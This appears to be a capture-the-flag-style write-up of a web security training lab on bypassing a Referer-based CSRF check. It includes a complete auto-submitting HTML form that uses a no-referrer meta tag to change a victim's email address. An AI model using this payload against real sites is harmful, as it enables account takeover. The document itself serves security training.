# CSRF where Referer validation depends on header being present

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

### Analysis/Exploitation -

Login as user `wiener`:

Update the email 

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/c4cea6d5-2dc5-4788-a3a5-cf1b7358304b/2024-02-27_15-29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666GM47X42%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210332Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJFMEMCIFmnzzjb1CjYmGGMBAMpu9WbcnDANJj1UBo0MKp6YnngAh82e1hkiBfTxioOiPrGeEicTAU8g0r%2BFhTHFTrk42BeKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxR%2BSVXzmbhGc%2BuUykq3ANruLPj%2FJzr3bW8OFkmcn8mUTQdxXZvVF08DAyjEENYUvf%2B6zJuoTlpJrCHH4ITyR8A8cRlW2KL4Ts9ML2km37zYWbccqqbwmgGP1OmF0VFoUoAF9HXkHX9%2FGpA6HKSe7ClKYBnoMIV0DJsSqNUcirsfb3iinDS8TMrnRjrvDwy4k2M3IrojiQ4NXTandaCtVgJDDq8AQCfrY0FASt5AqxE0kAK78jA0MFD%2FybXzIUeAzvGfSM8OjkYcnWFHbtuS6clW6x64KJUH%2FatLssE6a9ewA6C5%2B%2FSwdOWdFNYl5wNI0idVSFQdr51%2FP%2FvLECu7HWS983w2IowHpwru40ntRPksjefc6OkTd81l5wFvGz7RMBB11JhPbtAATHr4s3jGPkM3CV7GKC5FKz%2FBXDKgoWxgtkGcqezu%2BLcZB2NZpdorLwQ0%2FwrfQppecJn9ZNSRZ3ymcOITAr8b%2Fbn9Fkw8tihFWtvoJUZKO%2Fl2lVWzi8KExHKgCIQbt9CHLLq1yVcrDVgCFfLEh5mdOkl1Dl0FpDdqSmW5eU%2FYcm1NUkhFL%2BJDIwi8AwfbMrMzugmPsdHdWeKoEP1pMwHKHKwPNjtNAtClq2s1%2FF3wCNgk1KqMKwsaUUeq6YP8Qs5ZH118jDUyKLUBjqnAXIntBC07r4RsmijYWYiJLLW7kjq%2FEaG9okW4zSltckDzjtb%2BDaGkgoxj1%2BYmNeVqTo1rgS%2FmcrVDLJm7tIWJ4jimhCnMJXI5rlYy3zV8T8XXWMeQymXrAK%2FiM3xtEJvpvIV25%2BE9TWr4sA%2FxksGKySZRodxlXOALs6RpbiXjNSKuqvSvisTQGBrWoBLYOyWEJmDgC2MVnEWZ98RZbPbd%2FWm1WqhtVeJ&X-Amz-Signature=e4eb96a655032040214852f0acc49e1368c440e915e5bf61a536fb5ee1f3308b&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

> 💡 In order for a CSRF attack to be possible:

  - A relevant action: change a users email
  - Cookie-based session handling: session cookie
  - No unpredictable request parameters: no csrf token
**Generate CSRF PoC** (in prof. version.) or  
**craft a HTML form that performs CSRF attack to the victim:**

use the `exploit server` to test CSRF attack!

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/10ba55c1-6334-4b67-90ca-bbc7fb1d9293/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666GM47X42%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210332Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJFMEMCIFmnzzjb1CjYmGGMBAMpu9WbcnDANJj1UBo0MKp6YnngAh82e1hkiBfTxioOiPrGeEicTAU8g0r%2BFhTHFTrk42BeKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxR%2BSVXzmbhGc%2BuUykq3ANruLPj%2FJzr3bW8OFkmcn8mUTQdxXZvVF08DAyjEENYUvf%2B6zJuoTlpJrCHH4ITyR8A8cRlW2KL4Ts9ML2km37zYWbccqqbwmgGP1OmF0VFoUoAF9HXkHX9%2FGpA6HKSe7ClKYBnoMIV0DJsSqNUcirsfb3iinDS8TMrnRjrvDwy4k2M3IrojiQ4NXTandaCtVgJDDq8AQCfrY0FASt5AqxE0kAK78jA0MFD%2FybXzIUeAzvGfSM8OjkYcnWFHbtuS6clW6x64KJUH%2FatLssE6a9ewA6C5%2B%2FSwdOWdFNYl5wNI0idVSFQdr51%2FP%2FvLECu7HWS983w2IowHpwru40ntRPksjefc6OkTd81l5wFvGz7RMBB11JhPbtAATHr4s3jGPkM3CV7GKC5FKz%2FBXDKgoWxgtkGcqezu%2BLcZB2NZpdorLwQ0%2FwrfQppecJn9ZNSRZ3ymcOITAr8b%2Fbn9Fkw8tihFWtvoJUZKO%2Fl2lVWzi8KExHKgCIQbt9CHLLq1yVcrDVgCFfLEh5mdOkl1Dl0FpDdqSmW5eU%2FYcm1NUkhFL%2BJDIwi8AwfbMrMzugmPsdHdWeKoEP1pMwHKHKwPNjtNAtClq2s1%2FF3wCNgk1KqMKwsaUUeq6YP8Qs5ZH118jDUyKLUBjqnAXIntBC07r4RsmijYWYiJLLW7kjq%2FEaG9okW4zSltckDzjtb%2BDaGkgoxj1%2BYmNeVqTo1rgS%2FmcrVDLJm7tIWJ4jimhCnMJXI5rlYy3zV8T8XXWMeQymXrAK%2FiM3xtEJvpvIV25%2BE9TWr4sA%2FxksGKySZRodxlXOALs6RpbiXjNSKuqvSvisTQGBrWoBLYOyWEJmDgC2MVnEWZ98RZbPbd%2FWm1WqhtVeJ&X-Amz-Signature=ca756f1c1f6e03bb4dbc03dd198044fc451bc8f9a394c44bc79a7be36ca74da9&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/284bd78e-f50c-4407-a692-7550d0ba1fd0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666GM47X42%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210332Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJFMEMCIFmnzzjb1CjYmGGMBAMpu9WbcnDANJj1UBo0MKp6YnngAh82e1hkiBfTxioOiPrGeEicTAU8g0r%2BFhTHFTrk42BeKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxR%2BSVXzmbhGc%2BuUykq3ANruLPj%2FJzr3bW8OFkmcn8mUTQdxXZvVF08DAyjEENYUvf%2B6zJuoTlpJrCHH4ITyR8A8cRlW2KL4Ts9ML2km37zYWbccqqbwmgGP1OmF0VFoUoAF9HXkHX9%2FGpA6HKSe7ClKYBnoMIV0DJsSqNUcirsfb3iinDS8TMrnRjrvDwy4k2M3IrojiQ4NXTandaCtVgJDDq8AQCfrY0FASt5AqxE0kAK78jA0MFD%2FybXzIUeAzvGfSM8OjkYcnWFHbtuS6clW6x64KJUH%2FatLssE6a9ewA6C5%2B%2FSwdOWdFNYl5wNI0idVSFQdr51%2FP%2FvLECu7HWS983w2IowHpwru40ntRPksjefc6OkTd81l5wFvGz7RMBB11JhPbtAATHr4s3jGPkM3CV7GKC5FKz%2FBXDKgoWxgtkGcqezu%2BLcZB2NZpdorLwQ0%2FwrfQppecJn9ZNSRZ3ymcOITAr8b%2Fbn9Fkw8tihFWtvoJUZKO%2Fl2lVWzi8KExHKgCIQbt9CHLLq1yVcrDVgCFfLEh5mdOkl1Dl0FpDdqSmW5eU%2FYcm1NUkhFL%2BJDIwi8AwfbMrMzugmPsdHdWeKoEP1pMwHKHKwPNjtNAtClq2s1%2FF3wCNgk1KqMKwsaUUeq6YP8Qs5ZH118jDUyKLUBjqnAXIntBC07r4RsmijYWYiJLLW7kjq%2FEaG9okW4zSltckDzjtb%2BDaGkgoxj1%2BYmNeVqTo1rgS%2FmcrVDLJm7tIWJ4jimhCnMJXI5rlYy3zV8T8XXWMeQymXrAK%2FiM3xtEJvpvIV25%2BE9TWr4sA%2FxksGKySZRodxlXOALs6RpbiXjNSKuqvSvisTQGBrWoBLYOyWEJmDgC2MVnEWZ98RZbPbd%2FWm1WqhtVeJ&X-Amz-Signature=d6e9f876587331f4f2bbd28b0396c55962b67e78f3fdeede93a9a4eb95be8448&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/49d61922-5ef6-44ef-bd44-dce28f076652/2024-02-27_15-45.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666GM47X42%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210332Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJFMEMCIFmnzzjb1CjYmGGMBAMpu9WbcnDANJj1UBo0MKp6YnngAh82e1hkiBfTxioOiPrGeEicTAU8g0r%2BFhTHFTrk42BeKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxR%2BSVXzmbhGc%2BuUykq3ANruLPj%2FJzr3bW8OFkmcn8mUTQdxXZvVF08DAyjEENYUvf%2B6zJuoTlpJrCHH4ITyR8A8cRlW2KL4Ts9ML2km37zYWbccqqbwmgGP1OmF0VFoUoAF9HXkHX9%2FGpA6HKSe7ClKYBnoMIV0DJsSqNUcirsfb3iinDS8TMrnRjrvDwy4k2M3IrojiQ4NXTandaCtVgJDDq8AQCfrY0FASt5AqxE0kAK78jA0MFD%2FybXzIUeAzvGfSM8OjkYcnWFHbtuS6clW6x64KJUH%2FatLssE6a9ewA6C5%2B%2FSwdOWdFNYl5wNI0idVSFQdr51%2FP%2FvLECu7HWS983w2IowHpwru40ntRPksjefc6OkTd81l5wFvGz7RMBB11JhPbtAATHr4s3jGPkM3CV7GKC5FKz%2FBXDKgoWxgtkGcqezu%2BLcZB2NZpdorLwQ0%2FwrfQppecJn9ZNSRZ3ymcOITAr8b%2Fbn9Fkw8tihFWtvoJUZKO%2Fl2lVWzi8KExHKgCIQbt9CHLLq1yVcrDVgCFfLEh5mdOkl1Dl0FpDdqSmW5eU%2FYcm1NUkhFL%2BJDIwi8AwfbMrMzugmPsdHdWeKoEP1pMwHKHKwPNjtNAtClq2s1%2FF3wCNgk1KqMKwsaUUeq6YP8Qs5ZH118jDUyKLUBjqnAXIntBC07r4RsmijYWYiJLLW7kjq%2FEaG9okW4zSltckDzjtb%2BDaGkgoxj1%2BYmNeVqTo1rgS%2FmcrVDLJm7tIWJ4jimhCnMJXI5rlYy3zV8T8XXWMeQymXrAK%2FiM3xtEJvpvIV25%2BE9TWr4sA%2FxksGKySZRodxlXOALs6RpbiXjNSKuqvSvisTQGBrWoBLYOyWEJmDgC2MVnEWZ98RZbPbd%2FWm1WqhtVeJ&X-Amz-Signature=55c2191fac6b80081584e0beb9d3cae9706ac62ea7b8686a488ba9d5664fa257&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

Since the `Referer` HTTP header can be fully controlled by the attacker, we can bypass this check!

send this request into Repeater and simply remove the referrer header, 

The request goes through and the email gets changed

In this case I need to coerce the browser of the victim to not send the referrer header.

> 💡 **According to **[**Mozilla web docs**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)**, we can use the **`<meta>`** tag to ignore **`Referer`** HTTP header:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-11/images/Pasted%20image%2020221215051342.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-11/images/Pasted%20image%2020221215051352.png)

**To bypass that, add a new **`<meta>`** tag to ignore **`Referer`** header:**

 integrate directive into the HTML code itself:

```html
<html>
  <head>
	    <meta name="referrer" content="no-referrer">
    </head>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a2b0080046a2b6781242625009d001c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test1&#64;domain&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/f91b02fc-1932-415d-9fbe-0af59f93a9c2/2024-02-27_16-07.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666GM47X42%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210332Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJFMEMCIFmnzzjb1CjYmGGMBAMpu9WbcnDANJj1UBo0MKp6YnngAh82e1hkiBfTxioOiPrGeEicTAU8g0r%2BFhTHFTrk42BeKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxR%2BSVXzmbhGc%2BuUykq3ANruLPj%2FJzr3bW8OFkmcn8mUTQdxXZvVF08DAyjEENYUvf%2B6zJuoTlpJrCHH4ITyR8A8cRlW2KL4Ts9ML2km37zYWbccqqbwmgGP1OmF0VFoUoAF9HXkHX9%2FGpA6HKSe7ClKYBnoMIV0DJsSqNUcirsfb3iinDS8TMrnRjrvDwy4k2M3IrojiQ4NXTandaCtVgJDDq8AQCfrY0FASt5AqxE0kAK78jA0MFD%2FybXzIUeAzvGfSM8OjkYcnWFHbtuS6clW6x64KJUH%2FatLssE6a9ewA6C5%2B%2FSwdOWdFNYl5wNI0idVSFQdr51%2FP%2FvLECu7HWS983w2IowHpwru40ntRPksjefc6OkTd81l5wFvGz7RMBB11JhPbtAATHr4s3jGPkM3CV7GKC5FKz%2FBXDKgoWxgtkGcqezu%2BLcZB2NZpdorLwQ0%2FwrfQppecJn9ZNSRZ3ymcOITAr8b%2Fbn9Fkw8tihFWtvoJUZKO%2Fl2lVWzi8KExHKgCIQbt9CHLLq1yVcrDVgCFfLEh5mdOkl1Dl0FpDdqSmW5eU%2FYcm1NUkhFL%2BJDIwi8AwfbMrMzugmPsdHdWeKoEP1pMwHKHKwPNjtNAtClq2s1%2FF3wCNgk1KqMKwsaUUeq6YP8Qs5ZH118jDUyKLUBjqnAXIntBC07r4RsmijYWYiJLLW7kjq%2FEaG9okW4zSltckDzjtb%2BDaGkgoxj1%2BYmNeVqTo1rgS%2FmcrVDLJm7tIWJ4jimhCnMJXI5rlYy3zV8T8XXWMeQymXrAK%2FiM3xtEJvpvIV25%2BE9TWr4sA%2FxksGKySZRodxlXOALs6RpbiXjNSKuqvSvisTQGBrWoBLYOyWEJmDgC2MVnEWZ98RZbPbd%2FWm1WqhtVeJ&X-Amz-Signature=3a062ff2a0279ee42ae14b2ac94a66ee86d36254948730cb9d270d3f0efe35b9&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

or As an alternative, update exploit page header with the relevant syntax:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/e1cd84d1-fe2e-4ac3-bbc1-2a85212aa532/2024-02-27_16-05.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666GM47X42%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210332Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJFMEMCIFmnzzjb1CjYmGGMBAMpu9WbcnDANJj1UBo0MKp6YnngAh82e1hkiBfTxioOiPrGeEicTAU8g0r%2BFhTHFTrk42BeKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxR%2BSVXzmbhGc%2BuUykq3ANruLPj%2FJzr3bW8OFkmcn8mUTQdxXZvVF08DAyjEENYUvf%2B6zJuoTlpJrCHH4ITyR8A8cRlW2KL4Ts9ML2km37zYWbccqqbwmgGP1OmF0VFoUoAF9HXkHX9%2FGpA6HKSe7ClKYBnoMIV0DJsSqNUcirsfb3iinDS8TMrnRjrvDwy4k2M3IrojiQ4NXTandaCtVgJDDq8AQCfrY0FASt5AqxE0kAK78jA0MFD%2FybXzIUeAzvGfSM8OjkYcnWFHbtuS6clW6x64KJUH%2FatLssE6a9ewA6C5%2B%2FSwdOWdFNYl5wNI0idVSFQdr51%2FP%2FvLECu7HWS983w2IowHpwru40ntRPksjefc6OkTd81l5wFvGz7RMBB11JhPbtAATHr4s3jGPkM3CV7GKC5FKz%2FBXDKgoWxgtkGcqezu%2BLcZB2NZpdorLwQ0%2FwrfQppecJn9ZNSRZ3ymcOITAr8b%2Fbn9Fkw8tihFWtvoJUZKO%2Fl2lVWzi8KExHKgCIQbt9CHLLq1yVcrDVgCFfLEh5mdOkl1Dl0FpDdqSmW5eU%2FYcm1NUkhFL%2BJDIwi8AwfbMrMzugmPsdHdWeKoEP1pMwHKHKwPNjtNAtClq2s1%2FF3wCNgk1KqMKwsaUUeq6YP8Qs5ZH118jDUyKLUBjqnAXIntBC07r4RsmijYWYiJLLW7kjq%2FEaG9okW4zSltckDzjtb%2BDaGkgoxj1%2BYmNeVqTo1rgS%2FmcrVDLJm7tIWJ4jimhCnMJXI5rlYy3zV8T8XXWMeQymXrAK%2FiM3xtEJvpvIV25%2BE9TWr4sA%2FxksGKySZRodxlXOALs6RpbiXjNSKuqvSvisTQGBrWoBLYOyWEJmDgC2MVnEWZ98RZbPbd%2FWm1WqhtVeJ&X-Amz-Signature=3e0b30a6e73b0007113144fad0c45c49f0a020cc49482ffb7dbe8bad5889c338&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

